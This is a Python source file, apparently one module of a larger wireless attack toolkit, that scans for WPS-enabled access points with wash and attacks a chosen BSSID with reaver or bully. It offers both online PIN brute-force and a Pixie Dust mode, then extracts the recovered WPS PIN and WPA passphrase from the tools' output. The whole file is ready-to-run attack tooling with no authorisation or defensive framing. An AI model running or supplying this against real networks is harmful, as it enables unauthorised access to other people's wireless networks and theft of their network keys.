#!/usr/bin/env python3
"""
wps_attacker — WPS PIN attacks via reaver, bully, or wash (discovery).

CLI deps: reaver, bully, wash (all from aircrack-ng / bully packages on Kali)

Discovers WPS-enabled APs (wash) and attacks them via online PIN brute-force
or Pixie Dust offline attack (reaver/bully).

REQUIRES: Root privileges, monitor-mode interface.
"""

import json
import re
import time

from base_module import TacticalModule


class WPSAttacker(TacticalModule):
    name = "wps_attacker"
    description = "WPS PIN attacks via reaver, bully, or wash (discovery)"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--tool",
            choices=["reaver", "bully", "wash"],
            default="reaver",
            help="WPS tool to use (default: reaver). wash=discovery only.",
        )
        self.parser.add_argument(
            "--bssid",
            help="Target AP BSSID (required for reaver/bully)",
        )
        self.parser.add_argument(
            "--interface", required=True,
            help="Monitor-mode wireless interface",
        )
        self.parser.add_argument(
            "--channel", type=int,
            help="Target AP channel",
        )
        self.parser.add_argument(
            "--pixie-dust", action="store_true",
            help="Use Pixie Dust attack (offline, fast)",
        )
        self.parser.add_argument(
            "--duration", type=int, default=120,
            help="Max duration in seconds for wash scan (default: 120)",
        )

    def run(self, args) -> None:
        if not self.validate_interface(args.interface):
            self.output_error(f"Invalid interface: {args.interface}")
            return
        if not self.check_interface_exists(args.interface):
            self.output_error(f"Interface {args.interface} does not exist")
            return
        if not self.check_root():
            return

        if args.tool == "wash":
            self._run_wash(args)
        elif args.tool in ("reaver", "bully"):
            if not args.bssid:
                self.output_error("--bssid is required for reaver/bully")
                return
            if not self.validate_mac(args.bssid):
                self.output_error(f"Invalid BSSID: {args.bssid}")
                return
            if args.tool == "reaver":
                self._run_reaver(args)
            else:
                self._run_bully(args)

    def _run_wash(self, args) -> None:
        """Discover WPS-enabled APs using wash."""
        wash_args = ["-i", args.interface, "-j"]  # -j = JSON output
        if args.channel:
            wash_args.extend(["-c", str(args.channel)])

        start = time.monotonic()
        stdout, stderr = self.run_tool_popen("wash", wash_args, duration=args.duration)
        duration_ms = int((time.monotonic() - start) * 1000)

        # Parse wash output (one JSON object per line or tabular)
        aps = self._parse_wash(stdout)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0, stdout[:5000], stderr[:5000], duration_ms,
        )
        self.output_success({
            "tool": "wash",
            "interface": args.interface,
            "wps_aps": aps,
            "count": len(aps),
            "duration_ms": duration_ms,
        })

    def _run_reaver(self, args) -> None:
        """Attack WPS PIN via reaver."""
        reaver_args = [
            "-i", args.interface,
            "-b", args.bssid,
            "-vv",
        ]
        if args.channel:
            reaver_args.extend(["-c", str(args.channel)])
        if args.pixie_dust:
            reaver_args.extend(["-K", "1"])  # Pixie Dust

        start = time.monotonic()
        stdout, stderr = self.run_tool_popen("reaver", reaver_args, duration=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        pin, psk = self._parse_reaver(stdout + stderr)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0 if pin else 1, stdout[:5000], stderr[:5000], duration_ms,
        )
        self.output_success({
            "tool": "reaver",
            "bssid": args.bssid,
            "pixie_dust": args.pixie_dust,
            "wps_pin": pin,
            "wpa_psk": psk,
            "duration_ms": duration_ms,
        })

    def _run_bully(self, args) -> None:
        """Attack WPS PIN via bully."""
        bully_args = [args.interface, "-b", args.bssid, "-v", "3"]
        if args.channel:
            bully_args.extend(["-c", str(args.channel)])
        if args.pixie_dust:
            bully_args.extend(["-d"])  # Pixie Dust mode

        start = time.monotonic()
        stdout, stderr = self.run_tool_popen("bully", bully_args, duration=args.timeout)
        duration_ms = int((time.monotonic() - start) * 1000)

        pin, psk = self._parse_bully(stdout + stderr)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0 if pin else 1, stdout[:5000], stderr[:5000], duration_ms,
        )
        self.output_success({
            "tool": "bully",
            "bssid": args.bssid,
            "pixie_dust": args.pixie_dust,
            "wps_pin": pin,
            "wpa_psk": psk,
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_wash(stdout: str) -> list[dict]:
        """Parse wash output for WPS-enabled APs."""
        aps: list[dict] = []
        for line in stdout.strip().split("\n"):
            line = line.strip()
            if not line or line.startswith("Wash") or line.startswith("BSSID") or line.startswith("---"):
                continue
            # Try JSON first
            try:
                data = json.loads(line)
                aps.append(data)
                continue
            except (json.JSONDecodeError, ValueError):
                pass
            # Tabular: BSSID Ch dBm WPS Lck Vendor ESSID
            parts = line.split()
            if len(parts) >= 6 and re.match(r"^([0-9A-Fa-f]{2}:){5}", parts[0]):
                aps.append({
                    "bssid": parts[0],
                    "channel": int(parts[1]) if parts[1].isdigit() else parts[1],
                    "signal_dbm": int(parts[2]) if parts[2].lstrip("-").isdigit() else parts[2],
                    "wps_version": parts[3],
                    "locked": parts[4].upper() == "YES",
                    "essid": " ".join(parts[5:]) if len(parts) > 5 else "",
                })
        return aps

    @staticmethod
    def _parse_reaver(output: str) -> tuple[str, str]:
        """Extract WPS PIN and WPA PSK from reaver output."""
        pin = ""
        psk = ""
        pin_match = re.search(r"WPS PIN:\s*'?(\d{8})'?", output)
        if pin_match:
            pin = pin_match.group(1)
        psk_match = re.search(r"WPA PSK:\s*'([^']+)'", output)
        if psk_match:
            psk = psk_match.group(1)
        return pin, psk

    @staticmethod
    def _parse_bully(output: str) -> tuple[str, str]:
        """Extract WPS PIN and WPA PSK from bully output."""
        pin = ""
        psk = ""
        pin_match = re.search(r"pin:\s*(\d{8})", output, re.IGNORECASE)
        if pin_match:
            pin = pin_match.group(1)
        psk_match = re.search(r"key:\s*(.+)", output, re.IGNORECASE)
        if psk_match:
            psk = psk_match.group(1).strip().strip("'\"")
        return pin, psk


if __name__ == "__main__":
    WPSAttacker().execute()
